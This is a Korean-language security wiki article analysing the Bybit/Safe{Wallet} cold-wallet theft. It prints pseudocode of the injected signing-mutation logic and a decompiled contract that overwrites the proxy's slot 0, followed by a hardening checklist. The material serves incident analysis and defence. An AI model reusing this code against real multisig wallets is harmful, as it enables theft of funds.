# Web3 Signing Workflow Compromise 및 Safe Delegatecall Proxy Takeover

## 개요

cold-wallet theft chain은 **Safe{Wallet} web UI의 supply-chain compromise**와 **proxy의 implementation pointer(slot 0)를 덮어쓰는 on-chain delegatecall primitive**를 결합했습니다. 핵심 요점은 다음과 같습니다.

- dApp이 signing path에 code를 주입할 수 있다면, 다른 signer들이 알아채지 못하도록 원래 UI 데이터를 복원하면서 signer가 attacker가 선택한 fields에 대한 유효한 **EIP-712 signature**를 생성하게 만들 수 있습니다.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Safe proxy는 `masterCopy`(implementation)를 **storage slot 0**에 저장합니다. slot 0에 쓰기 작업을 수행하는 contract로 delegatecall하면 사실상 Safe를 attacker logic으로 “upgrade”하여 wallet에 대한 완전한 control을 얻을 수 있습니다.<sup>[[3]](#references)</sup>

## Off-chain: Safe{Wallet}의 targeted signing mutation

변조된 Safe bundle(`_app-*.js`)은 특정 Safe 및 signer address를 선택적으로 공격했습니다. 주입된 logic은 signing call 직전에 실행되었습니다.<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 공격 속성
- **Context-gated**: 피해자 Safe/서명자에 대한 하드코딩된 allowlist로 불필요한 노이즈를 방지하고 탐지 가능성을 낮췄습니다.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: `signTransaction` 직전에 필드(`to`, `data`, `operation`, gas)를 덮어쓴 다음 되돌렸기 때문에, UI의 proposal payload는 정상적으로 보이는 반면 서명은 attacker payload와 일치했습니다.<sup>[[3]](#references)</sup>
- **EIP-712 opacity**: wallet은 구조화된 데이터를 표시했지만 중첩된 calldata를 decode하거나 `operation = delegatecall`을 강조하지 않았으므로, 변조된 메시지는 사실상 blind-signed되었습니다.<sup>[[3]](#references)[[4]](#references)</sup>

### Gateway validation relevance
Safe proposal은 **Safe Client Gateway**로 제출됩니다.<sup>[[5]](#references)</sup> 강화된 검사 이전에는 UI가 signing 후 값을 다시 작성할 경우, JSON body의 필드와 다른 `safeTxHash`/signature에 해당하는 proposal을 gateway가 수락할 수 있었습니다. 사건 이후 gateway는 hash/signature가 제출된 transaction과 일치하지 않는 proposal을 거부합니다.<sup>[[3]](#references)</sup> 유사한 server-side hash verification은 모든 signing-orchestration API에 적용되어야 합니다.

### 2025 Bybit/Safe incident highlights
- 2025년 2월 21일 Bybit cold-wallet drain(약 401k ETH)은 동일한 패턴을 재사용했습니다. 침해된 Safe S3 bundle은 Bybit 서명자에 대해서만 trigger되었고, `operation=0` → `1`로 변경한 뒤 `to`를 slot 0에 쓰는 사전 배포된 attacker contract로 지정했습니다.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback에 cache된 `_app-52c9031bfa03da47.js`는 Bybit의 Safe(`0x1db9…cf4`)와 signer addresses를 기준으로 logic을 실행한 다음, 실행 2분 후 clean bundle로 즉시 rollback했으며, 이는 “mutate → sign → restore” 기법을 그대로 보여줍니다.<sup>[[1]](#references)[[2]](#references)</sup>
- 악성 contract(예: `0x9622…c7242`)에는 단순한 `sweepETH/sweepERC20` functions와 implementation slot에 값을 쓰는 `transfer(address,uint256)`가 포함되어 있었습니다. `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` 실행으로 proxy implementation이 변경되고 완전한 control이 부여되었습니다.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxy는 **storage slot 0**에 `masterCopy`를 저장하고 모든 logic을 해당 주소로 delegate합니다. Safe는 **`operation = 1` (delegatecall)**을 지원하므로, 서명된 모든 transaction이 임의의 contract를 지정하고 proxy의 storage context에서 해당 contract의 code를 실행할 수 있습니다.<sup>[[3]](#references)</sup>

공격자는 ERC-20 `transfer(address,uint256)`를 모방하지만 대신 `_to`를 slot 0에 쓰는 contract를 만들었습니다.<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:<sup>[[1]](#references)[[3]](#references)</sup>
1. 피해자는 `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`으로 `execTransaction`에 서명합니다.
2. Safe masterCopy는 이러한 매개변수에 대한 서명을 검증합니다.
3. Proxy는 `attackerContract`로 delegatecall을 수행하고, `transfer` 본문은 slot 0에 값을 기록합니다.
4. 이제 slot 0 (`masterCopy`)은 attacker가 제어하는 logic을 가리킵니다 → **지갑 전체 장악 및 자금 탈취**.

### Guard & version notes (post-incident hardening)
- Transaction guards는 Safe v1.3.0에서 도입되었으며 실행 전에 모든 `execTransaction` 매개변수를 검사할 수 있습니다. guard는 `delegatecall`을 거부하거나 destination 및 calldata에 대한 policy를 적용할 수 있습니다. Bybit은 이 hook보다 이전 버전인 v1.1.1을 사용했습니다.<sup>[[2]](#references)[[6]](#references)</sup>

## Detection & hardening checklist

- **UI integrity**: JS assets / SRI를 pin하고, bundle diff를 monitor하며, signing UI를 trust boundary의 일부로 취급합니다.
- **Sign-time validation**: **EIP-712 clear-signing**을 지원하는 hardware wallets를 사용하고, `operation`을 명시적으로 표시하며 중첩된 calldata를 decode합니다. policy에서 허용하지 않는 한 `operation = 1`일 때 서명을 거부합니다.<sup>[[3]](#references)</sup>
- **Server-side hash checks**: proposal을 relay하는 gateway/service는 `safeTxHash`를 다시 계산하고, 서명이 제출된 fields와 일치하는지 검증해야 합니다.<sup>[[3]](#references)</sup>
- **Policy/allowlists**: `to`, selectors, asset types에 대한 preflight rules를 적용하고, 검증된 flow를 제외한 delegatecall을 금지합니다. 완전히 서명된 transaction을 broadcast하기 전에 internal policy service를 거치도록 요구합니다.
- **Contract design**: 반드시 필요한 경우가 아니라면 multisig/treasury wallets에서 임의의 delegatecall을 노출하지 않습니다. 모든 implementation pointer를 upgrade primitive로 취급하고, 명시적인 access control로 보호하며 guard를 통해 delegatecall targets/selectors를 제한합니다. pointer를 다른 slot으로 옮기는 것만으로는 완전한 방어가 되지 않습니다.<sup>[[3]](#references)[[6]](#references)</sup>
- **Monitoring**: treasury funds를 보유한 wallet에서 delegatecall이 실행되는 경우와 일반적인 `call` patterns에서 `operation`이 변경되는 proposal에 대해 alert를 발생시킵니다.

## References

- [1] [Bybit Safe exploit에 대한 AnChain.AI forensic breakdown](https://www.anchain.ai/blog/bybit)
- [2] [Safe bundle compromise에 대한 Zero Hour Technology analysis](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Bybit hack에 대한 심층 technical analysis (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Safe smart account v1.3.0 changelog (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
